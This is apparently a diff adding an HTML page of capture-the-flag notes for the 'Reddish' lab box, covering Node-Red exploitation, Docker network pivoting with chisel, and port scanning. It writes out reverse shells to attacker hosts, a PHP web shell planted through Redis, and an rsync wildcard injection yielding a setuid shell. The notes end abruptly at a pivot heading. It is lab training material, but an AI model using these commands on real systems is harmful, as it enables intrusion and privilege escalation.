@@ -1,0 +1,86 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Reddish - Networking Pivots Docker Node-Red REDIS Chisel</title>
+</head><body>Nothing but an error page on 1880, but the tab has an icon<br/>
+Browse to favicon.ico and reverse image search to see it's Node-Red<br/>
+<br/>
+A POST request will give information about the /red/&lt;ID&gt; and you can browse directly to /red/&lt;ID&gt; to see the flow<br/>
+<br/>
+Let's create a new flow:<br/>
+TCP input -&gt; connect to port 4444 at 10.10.14.3 (attacker) -&gt; <br/>
+exec -&gt;<br/>
+TCP output -&gt; connect to reply<br/>
+<br/>
+and we get a connection with nc. Make sure to connect all flows from exec to TCP output (there should be three nodes on exec, one for STDIN, STDOUT, STDERR). <br/>
+<br/>
+Trying to transfer files, the /dev/tcp function is only available in bash, but we land in a dash shell. Transfer files with <br/>
+/bin/bash -c "cat &lt; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; &gt; file"<br/>
+<br/>
+<b>Pingscan</b><br/>
+for ip in $(seq 1 5); do ping -c 1 172.18.0.$ip &gt; /dev/null &amp;&amp; echo "Online: 172.18.0.$ip"; done<br/>
+<br/>
+<b>Portscan</b><br/>
+for port in 22 25 80 443 8080 8443; do (echo PleaseSubscribe &gt; /dev/tcp/&lt;RHOST&gt;/$port &gt; /dev/null &amp;&amp; echo "open - $port") 2&gt; /dev/null; done<br/>
+<br/>
+We see port 80 is open on 172.19.0.3, let's see what's there:<br/>
+Kali# ./chisel server -p 8000 -reverse -v<br/>
+Node# ./chisel client &lt;Kali&gt;:8000 R:127.0.0.1:8001:172.19.0.3:80<br/>
+By specifying 127.0.0.1:8001, we are saying to only listen on localhost and not on 0.0.0.0 (network any)<br/>
+Kali#: curl 127.0.0.1:80<br/>
+&nbsp;&#09;Yay!<br/>
+<br/>
+Webpage notes that there is a shared folder with the web and database containers and a database backup function. Running a portscan shows port 6379 open on 172.19.0.2. Let's get at it. <br/>
+Node# ./chisel client &lt;Kali&gt;:8000 R:127.0.0.1:6379:172.19.0.2:6379<br/>
+6379: Redis key store<br/>
+<br/>
+Happens to have an RCE<br/>
+Kali# nc localhost 6379<br/>
+echo "Hey no AUTH required!"<br/>
+$21<br/>
+Hey no AUTH required!<br/>
+<br/>
+Curiously, the database function in the webpage, ajax.php?test= is a direct connection to Redis. So this is an option instead of forwarding the Redis port.<br/>
+<br/>
+Redis has the ability to execute PHP code.<br/>
+Kali# flushall<br/>
++OK<br/>
+set PleaseSubscribe "&lt;? system($_REQUEST['ippsec']); ?&gt;"<br/>
++OK<br/>
+config set dbfilename ippsec.php<br/>
++OK<br/>
+config set dir /var/www/html/<br/>
++OK<br/>
+save<br/>
++OK<br/>
+<br/>
+and now we can browse to: <br/>
+localhost:8001/ippsec.php?ippsec=whoami<br/>
+we can get code exec! and now just spawn a shell into the database container (not easy though because the database cannot connect all the way back to Kali). Set up a local pivot<br/>
+<br/>
+Node# ./chisel client &lt;Kali&gt;:8000 9002:127.0.0.1:8002<br/>
+Kali# nc -lvnp 8002<br/>
+Redis# bash -c "bash -i &gt;&amp; /dev/tcp/&lt;Node&gt;/9002 0&gt;&amp;1"<br/>
+Kali# shell! <br/>
+<br/>
+Wildcard injection with backup.sh with rsync<br/>
+backup.sh<br/>
+&nbsp;&#09;rsync -a *.rdb rsync://backup:873/src/rdb/<br/>
+<br/>
+PleaseSubscribe.rdb<br/>
+#!/bin/sh<br/>
+cp /bin/dash /tmp/privesc<br/>
+chmod 4755 /tmp/privesc<br/>
+<br/>
+touch -- '-e "sh PleaseSubscribe.rdb"'<br/>
+<br/>
+/tmp/privesc -p<br/>
+<br/>
+And we can now read user.txt in /home/somaro<br/>
+<br/>
+But what is really interesting...rsync is being run without a password to the backup server! <br/>
+<br/>
+<br/>
+Pivoting magic to get onto backup<br/>
+</body></html>
